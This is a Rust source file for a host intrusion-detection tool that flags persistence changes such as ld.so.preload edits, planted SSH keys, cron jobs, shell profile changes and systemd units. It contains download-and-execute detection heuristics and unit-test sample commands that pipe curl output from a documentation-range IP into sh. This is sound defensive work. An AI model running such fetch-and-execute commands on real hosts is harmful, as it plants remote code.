//! D3 - Persistence modification.
//!
//! Every rule here follows the same shape: identify the persistence surface,
//! decide whether the change looks operator-driven (see [`Ctx::attribute`]), and
//! emit INFO for interactive edits or HIGH/CRITICAL for unattended ones.

use crate::alert::Finding;
use crate::detect::{writer_label, Ctx};
use crate::events::{
    is_container_overlay_path, is_editor_artifact, DetectionId, FileEvent, FileKind, Severity,
};
use crate::proctree::{is_user_mgmt_tool, role_of, Role};

pub fn evaluate(ev: &FileEvent, ctx: &Ctx) -> Vec<Finding> {
    let mut findings = Vec::new();

    if ev.container && is_container_overlay_path(&ev.path) {
        return findings;
    }
    if matches!(ev.kind, FileKind::Removed | FileKind::MovedFrom) {
        return findings;
    }
    if is_editor_artifact(&ev.path) || ctx.allowlist.path_allowed(&ev.path) {
        return findings;
    }

    findings.extend(ld_preload(ev, ctx));
    findings.extend(ld_conf(ev, ctx));
    findings.extend(authorized_keys(ev, ctx));
    findings.extend(cron_paths(ev, ctx));
    findings.extend(shell_profiles(ev, ctx));
    findings.extend(systemd_units(ev, ctx));
    findings
}

/// Writer belongs to a package/config manager - those legitimately touch every
/// persistence surface on the system.
fn writer_is_installer(ev: &FileEvent, ctx: &Ctx) -> bool {
    let Some(w) = &ev.writer else { return false };
    if matches!(
        role_of(&w.comm, &w.exe),
        Role::PackageManager | Role::ConfigManager
    ) {
        return true;
    }
    ctx.tree.chain_of(w.pid).iter().any(|p| {
        matches!(
            role_of(&p.comm, &p.exe),
            Role::PackageManager | Role::ConfigManager
        )
    })
}

fn ld_preload(ev: &FileEvent, _ctx: &Ctx) -> Option<Finding> {
    if ev.path != "/etc/ld.so.preload" {
        return None;
    }
    let libs: Vec<String> = ev
        .content
        .as_deref()
        .unwrap_or("")
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(str::to_string)
        .collect();
    let mut f = Finding::new(
        DetectionId::D3,
        Severity::Critical,
        "ld.so.preload modified",
        "d3|ld-preload",
    )
    .what(format!(
        "/etc/ld.so.preload was {} by {}. Every new process on this host will now load the \
         listed libraries before anything else.",
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .why(
        "ld.so.preload injects code into every dynamically linked program on the system. It is \
         the most powerful userland rootkit and hooking primitive available and no routine \
         workflow writes to it.",
    )
    .actions([
        "Inspect the file now and remove any library you did not install.",
        "Treat the host as compromised; the listed libraries can hide processes, files and sockets.",
        "Reboot into a known-good state once the entry is removed.",
    ]);
    if !libs.is_empty() {
        f = f.fact("Preloads", libs.join(", "));
    }
    Some(f)
}

fn ld_conf(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    if ev.path != "/etc/ld.so.conf.d" && !ev.path.starts_with("/etc/ld.so.conf.d/") {
        return None;
    }
    let nonstandard: Vec<String> = ev
        .content
        .as_deref()
        .unwrap_or("")
        .lines()
        .map(str::trim)
        .filter(|l| {
            !l.is_empty()
                && !l.starts_with('#')
                && !l.starts_with("/usr/")
                && !l.starts_with("/lib")
                && !l.starts_with("/opt/")
                && !l.starts_with("include ")
        })
        .map(str::to_string)
        .collect();

    if ev.content.is_some() && nonstandard.is_empty() {
        if writer_is_installer(ev, ctx) {
            return None;
        }
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "Dynamic loader config added",
                &format!("d3|ld-conf-info|{}", ev.path),
            )
            .what(format!(
                "{} was {} with standard library paths only.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Path", &ev.path)
            .why("Logged for context."),
        );
    }
    let severity = if writer_is_installer(ev, ctx) {
        Severity::Low
    } else {
        Severity::High
    };
    let mut f = Finding::new(
        DetectionId::D3,
        severity,
        "New dynamic loader search path",
        &format!("d3|ld-conf|{}", ev.path),
    )
    .what(format!(
        "{} was {} by {} and adds a library search path outside the standard system directories.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .fact("Path", &ev.path)
    .why(
        "A non-standard loader search path lets attacker-controlled shared libraries shadow \
         system ones for every program that links against them.",
    )
    .actions([
        "Remove the unauthorized path and run ldconfig.",
        "Check the referenced directory for unexpected .so files.",
        "Identify the process that wrote the file.",
    ]);
    if !nonstandard.is_empty() {
        f = f.fact("Paths", nonstandard.join(", "));
    }
    Some(f)
}

fn authorized_keys(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let name = ev.path.rsplit('/').next().unwrap_or("");
    if name != "authorized_keys" && name != "authorized_keys2" {
        return None;
    }
    let attribution = ctx.attribute(ev);
    let account = ev
        .path
        .strip_prefix("/home/")
        .and_then(|r| r.split('/').next())
        .or_else(|| {
            if ev.path.starts_with("/root/") {
                Some("root")
            } else {
                None
            }
        })
        .unwrap_or("unknown");
    let key_count = ev.content.as_deref().map(|c| {
        c.lines()
            .filter(|l| l.contains("ssh-") || l.contains("ecdsa-"))
            .count()
    });

    if attribution.is_interactive() {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "SSH authorized_keys edited during a session",
                &format!("d3|authorized-keys-session|{}", ev.path),
            )
            .what(format!(
                "{} was {} while an interactive session was active.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Account", account)
            .why("Logged for context. Operators add keys interactively (ssh-copy-id, editors)."),
        );
    }
    let mut f = Finding::new(
        DetectionId::D3,
        Severity::High,
        "SSH key added with no session present",
        &format!("d3|authorized-keys|{}", ev.path),
    )
    .what(format!(
        "{} was {} by {} while no interactive session was active on the host.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .fact("Account", account)
    .why(
        "Planting an SSH key is the most common way to keep access to a compromised account: \
         it survives password rotation and leaves no login prompt.",
    )
    .actions([
        "Review the newest entries in the file and remove any key you do not recognise.",
        "Audit recent activity for this account.",
        "Identify the process that wrote the file.",
    ]);
    if let Some(n) = key_count {
        f = f.fact("Keys now", n.to_string());
    }
    Some(f)
}

const CRON_PATHS: &[&str] = &[
    "/etc/crontab",
    "/etc/cron.d",
    "/etc/cron.hourly",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
    "/var/spool/cron",
    "/var/spool/cron/crontabs",
    "/etc/anacrontab",
    "/var/spool/anacron",
];

fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let is_cron = CRON_PATHS
        .iter()
        .any(|p| ev.path == *p || ev.path.starts_with(&format!("{}/", p)));
    if !is_cron {
        return None;
    }
    // `crontab -e` writes via the crontab binary; anacron updates its own timestamps.
    if let Some(w) = &ev.writer {
        if w.comm == "crontab" || w.comm == "anacron" || is_user_mgmt_tool(&w.comm) {
            return None;
        }
    }
    if ev.path.starts_with("/var/spool/anacron/") {
        return None;
    }
    if writer_is_installer(ev, ctx) {
        return None;
    }
    let attribution = ctx.attribute(ev);
    let system_table = ev.path == "/etc/crontab" || ev.path.starts_with("/etc/cron.d/");
    let commands = cron_commands(ev.content.as_deref().unwrap_or(""), system_table);
    let suspicious_cmd = commands.iter().any(|c| looks_like_staging(c));

    if attribution.is_interactive() && !suspicious_cmd {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "Cron entry edited during a session",
                &format!("d3|cron-session|{}", ev.path),
            )
            .what(format!(
                "{} was {} while an interactive session was active.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Path", &ev.path)
            .why("Logged for context. Operators manage cron interactively."),
        );
    }
    let severity = if suspicious_cmd {
        Severity::Critical
    } else {
        Severity::High
    };
    let mut f = Finding::new(
        DetectionId::D3,
        severity,
        if suspicious_cmd {
            "Cron job installed that downloads and runs remote code"
        } else {
            "Cron persistence with no session present"
        },
        &format!("d3|cron|{}", ev.path),
    )
    .what(format!(
        "{} was {} by {}{}.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref()),
        if attribution.is_interactive() {
            ""
        } else {
            " while no interactive session was active on the host"
        }
    ))
    .fact("Path", &ev.path)
    .why(
        "Cron jobs survive reboots and re-run attacker code on a schedule. Legitimate cron \
         changes come from operators, package installs or configuration management, all of \
         which HERMIAN recognises; this one matched none of them.",
    )
    .actions([
        "Inspect the new entry and the command it runs.",
        "Remove it if unauthorized and check whether it has already executed.",
        "Identify the process that wrote the file.",
    ]);
    if !commands.is_empty() {
        f = f.fact("Runs", commands.join(" | "));
    }
    Some(f)
}

/// Extract the command part of each cron line. System tables (`/etc/crontab`,
/// `/etc/cron.d/*`) carry a user field after the five time fields; per-user
/// crontabs do not.
fn cron_commands(content: &str, system_table: bool) -> Vec<String> {
    let skip_after_time = if system_table { 1 } else { 0 };
    content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter(|l| {
            // Skip VAR=value assignments (but not commands containing '=').
            match l.split_once('=') {
                Some((k, _)) => !k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
                None => true,
            }
        })
        .filter_map(|l| {
            let mut fields = l.split_whitespace();
            let first = fields.next()?;
            let rest: Vec<&str> = fields.collect();
            let skip = if first.starts_with('@') {
                skip_after_time
            } else {
                4 + skip_after_time
            };
            if rest.len() <= skip {
                return None;
            }
            Some(rest[skip..].join(" "))
        })
        .filter(|c| !c.is_empty())
        .take(4)
        .collect()
}

/// Heuristic for "download and execute" one-liners.
fn looks_like_staging(cmd: &str) -> bool {
    let lower = cmd.to_lowercase();
    let fetches = lower.contains("curl ") || lower.contains("wget ") || lower.contains("fetch ");
    let executes = lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| python")
        || lower.contains("| perl");
    let from_transient =
        lower.contains("/tmp/") || lower.contains("/dev/shm/") || lower.contains("/var/tmp/");
    (fetches && executes) || (from_transient && (lower.contains("sh ") || lower.contains("bash ")))
}

fn shell_profiles(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let is_system_profile = ev.path == "/etc/profile"
        || ev.path == "/etc/bash.bashrc"
        || ev.path == "/etc/zsh/zshrc"
        || ev.path.starts_with("/etc/profile.d/");
    let name = ev.path.rsplit('/').next().unwrap_or("");
    let is_user_profile = matches!(
        name,
        ".bashrc"
            | ".profile"
            | ".bash_profile"
            | ".bash_login"
            | ".zshrc"
            | ".zprofile"
            | ".zshenv"
            | ".zlogin"
    ) && (ev.path.starts_with("/home/") || ev.path.starts_with("/root/"));
    if !is_system_profile && !is_user_profile {
        return None;
    }
    if writer_is_installer(ev, ctx) {
        return None;
    }
    let attribution = ctx.attribute(ev);
    if attribution.is_interactive() {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "Shell profile edited during a session",
                &format!("d3|profile-session|{}", ev.path),
            )
            .what(format!("{} was {}.", ev.path, ev.kind.as_str()))
            .fact("Path", &ev.path)
            .why("Logged for context only."),
        );
    }
    Some(
        Finding::new(
            DetectionId::D3,
            Severity::High,
            "Shell profile changed with no session present",
            &format!("d3|profile|{}", ev.path),
        )
        .what(format!(
            "{} was {} by {} while no interactive session was active on the host.",
            ev.path,
            ev.kind.as_str(),
            writer_label(ev.writer.as_ref())
        ))
        .fact("Path", &ev.path)
        .why(
            "Shell profiles execute on every login. Appending to one without an active session \
             is a classic persistence move: the payload runs the next time anyone logs in.",
        )
        .actions([
            "Review the tail of the file for appended lines.",
            "Remove unauthorized content.",
            "Identify the process that wrote the file.",
        ]),
    )
}

fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let in_etc = ev.path.starts_with("/etc/systemd/system/");
    if !in_etc {
        return None;
    }
    let is_unit = [
        ".service",
        ".timer",
        ".socket",
        ".path",
        ".mount",
        ".target",
        ".automount",
    ]
    .iter()
    .any(|s| ev.path.ends_with(s));
    let is_enable_link = ev.path.contains(".wants/") || ev.path.contains(".requires/");
    if !is_unit && !is_enable_link {
        return None;
    }
    if ev.managed_by_package == Some(true) || writer_is_installer(ev, ctx) {
        return None;
    }
    // `systemctl enable` is performed by systemd itself (PID 1) creating the symlink.
    if is_enable_link {
        if let Some(w) = &ev.writer {
            if w.pid == 1 || w.comm == "systemctl" || w.comm == "systemd" {
                return None;
            }
        }
    }
    let attribution = ctx.attribute(ev);
    let exec_line = ev
        .content
        .as_deref()
        .and_then(|c| c.lines().find_map(|l| l.trim().strip_prefix("ExecStart=")))
        .map(str::to_string);
    let suspicious_exec = exec_line
        .as_deref()
        .map(|e| {
            e.contains("/tmp/")
                || e.contains("/dev/shm/")
                || e.contains("/var/tmp/")
                || looks_like_staging(e)
        })
        .unwrap_or(false);

    if attribution.is_interactive() && !suspicious_exec {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "systemd unit edited during a session",
                &format!("d3|systemd-session|{}", ev.path),
            )
            .what(format!(
                "{} was {} while an interactive session was active.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Path", &ev.path)
            .why("Logged for context. Operators install units interactively."),
        );
    }
    let severity = if suspicious_exec {
        Severity::Critical
    } else {
        Severity::High
    };
    let mut f = Finding::new(
        DetectionId::D3,
        severity,
        if is_enable_link {
            "systemd unit enabled outside of systemctl"
        } else if suspicious_exec {
            "systemd unit installed that runs from a transient directory"
        } else {
            "systemd unit installed with no session present"
        },
        &format!("d3|systemd|{}", ev.path),
    )
    .what(format!(
        "{} was {} by {} and does not belong to any installed package.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .fact("Unit", &ev.path)
    .why(
        "A systemd unit is code that runs at boot with whatever privileges it declares. New \
         units normally arrive via packages or an operator; this one arrived another way.",
    )
    .actions([
        "Read the unit file and the binary it executes.",
        "systemctl disable --now the unit and remove the file if unauthorized.",
        "Identify the process that wrote the file.",
    ]);
    if let Some(e) = exec_line {
        f = f.fact("ExecStart", e);
    }
    Some(f)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cron_command_extraction() {
        let c = "SHELL=/bin/sh\n# comment\n* * * * * root curl -s http://x/y | sh\n@reboot root /tmp/.a\n";
        let cmds = cron_commands(c, true);
        assert_eq!(cmds, vec!["curl -s http://x/y | sh", "/tmp/.a"]);
        let u = "PATH=/usr/bin\n0 3 * * * /usr/bin/backup --flag=1\n@daily /home/dev/sync\n";
        let cmds = cron_commands(u, false);
        assert_eq!(cmds, vec!["/usr/bin/backup --flag=1", "/home/dev/sync"]);
    }

    #[test]
    fn staging_heuristic() {
        assert!(looks_like_staging("curl -s http://198.51.100.1/x | sh"));
        assert!(looks_like_staging("bash /tmp/.payload"));
        assert!(!looks_like_staging("/usr/bin/certbot renew"));
        assert!(!looks_like_staging(
            "curl -fsS https://healthcheck.example/ping"
        ));
    }
}
